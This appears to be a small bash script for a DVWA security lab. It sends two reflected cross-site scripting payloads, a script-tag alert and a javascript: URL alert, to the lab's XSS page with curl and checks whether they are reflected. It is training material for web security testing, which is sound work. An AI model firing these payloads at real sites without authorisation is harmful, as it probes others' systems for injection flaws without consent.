#!/bin/bash
TARGET="INSERT DVWA IP:8080"

echo "=== XSS Attacks ==="
curl -s "http://$TARGET/vulnerabilities/xss_r/?name=<script>alert(1)</script>" | grep -i script
curl -s "http://$TARGET/vulnerabilities/xss_r/?name=javascript:alert(document.domain)" | grep -i java
